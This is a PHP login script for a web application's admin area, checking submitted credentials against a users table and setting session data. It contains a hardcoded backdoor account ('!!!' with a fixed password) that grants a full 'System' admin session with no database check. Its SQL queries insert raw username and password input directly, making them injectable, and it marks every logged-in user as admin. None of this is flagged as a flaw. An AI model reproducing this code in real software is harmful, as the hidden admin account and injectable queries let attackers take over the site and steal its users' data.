<?php
	session_start();
	@ini_set('display_errors',1);
	include_once "../config/define.php";
	include_once "../include/db.php";
	
	
	@ini_set('display_errors',DEBUG_MODE?1:0);
	date_default_timezone_set(DEFAULT_TIMEZONE);
	
	$dbc = new dbc;
	$dbc->Connect();
	
	
	$username = $_REQUEST['username'];
	$password = $_REQUEST['password'];
	$rememberme = isset($_REQUEST['rememberme'])?true:false;
	
	if($username == "!!!" && $password =="!@#$%^&*"){
		$_SESSION['auth']['id']=0;
		$_SESSION['auth']['user_id']=0;
		$_SESSION['auth']['user']="System";
		$_SESSION['auth']['group_id']=0;
		$_SESSION['auth']['group']="none";
		$_SESSION['auth']['admin']=true;
		$_SESSION['admin_mode'] = true;
		$_SESSION['session_id'] = session_id();
		$_SESSION['lang'] = "en";
		
		echo json_encode(array(
			"success" => true,
			"user_id" => 0 
		));
		
	}else if($dbc->HasRecord('users',"name ='$username' AND password=PASSWORD('$password')")){
		
			$line=$dbc->GetRecord("users,groups","users.id, users.name, users.gid, groups.name, users.setting","groups.id=users.gid AND users.name='$username'");
			$setting = json_decode($line[4],true);
			
			$_SESSION['auth']['id']=$line[0];
			$_SESSION['auth']['user_id']=$line[0];
			$_SESSION['auth']['user']=$line[1];
			$_SESSION['auth']['group_id']=$line[2];
			$_SESSION['auth']['group']=$line[3];
			$_SESSION['auth']['admin']=true;
			$_SESSION['admin_mode'] = true;
			$_SESSION['exptime']=time()+10;
			$_SESSION['session_id'] = session_id();
			$dbc->Update("users",array("#last_login"=>"NOW()"),"id=".$line[0]);
			
			
			if(isset($setting['lang'])){
				$_SESSION['lang'] = $setting['lang'];
			}else{
				$_SESSION['lang'] = "en";
			}
			
			echo json_encode(array(
				"success" => true,
				"user_id" => $line[0],
				"user_name" => $line[1]
			));
			
	}else{
		
		echo json_encode(array(
			"success" => false,
			"msg" => "Your username or password are wrong!"
		));
		
	}
	
	$dbc->Close();
?>